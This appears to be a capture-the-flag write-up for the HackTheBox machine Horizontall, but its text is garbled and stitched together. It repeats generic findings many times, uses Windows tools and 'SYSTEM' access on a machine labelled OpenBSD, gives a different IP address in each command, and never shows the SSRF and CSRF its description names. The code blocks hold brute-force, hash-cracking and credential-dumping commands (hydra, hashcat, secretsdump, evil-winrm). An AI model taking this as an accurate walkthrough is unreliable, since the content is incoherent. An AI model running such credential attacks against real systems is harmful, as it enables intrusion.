---
TitleSEO: "HackTheBox — Horizontall (Medium OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Horizontall (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Horizontall. SSRF and CSRF to achieve medium compromise on OpenBSD."
Keywords: "pwntilldawn, reversing, easy, forensics, web, hard, offsec"
URL: "https://zurefx.github.io/writeups/htb-horizontall-716.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-horizontall-716/"
Date: "2025-06-11"
Tags: "PwnTillDawn, Reversing, Easy, Forensics, Web, Hard, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-horizontall-716"
Permalink: "/writeups/htb-horizontall-716.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Horizontall** is rated **Medium** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.110.1.97`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.242.67 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.183.151 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Web Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.14.203.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
gobuster dir -u http://10.77.216.29/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p993,993,3389 10.22.48.115 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Sudo Misconfiguration**.

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.42.164.3 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.56.160.164
```

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```powershell
evil-winrm -i 10.97.137.166 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.105.57.199 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.232.217
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `netcat`
- `wmiexec`
- `sqlmap`
- `kerbrute`
- `nikto`
- `smbexec`

### Key Takeaways

- SSRF
- CSRF
- Sudo Misconfiguration
- Open Redirect
